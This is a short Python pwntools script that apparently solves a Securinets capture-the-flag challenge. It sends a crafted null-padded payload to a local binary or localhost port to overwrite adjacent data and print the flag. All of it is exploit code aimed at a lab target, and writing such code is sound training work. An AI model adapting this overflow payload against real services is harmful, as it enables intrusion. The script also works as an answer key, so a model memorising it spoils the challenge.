#!/usr/bin/env python3
from pwn import *

context.log_level = "error"

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9011)

payload = b"CyberLeek".ljust(32, b"\x00")
payload += b"NONE"
payload += p32(0) * 3

p.sendafter(b"alias:\n", payload)
p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
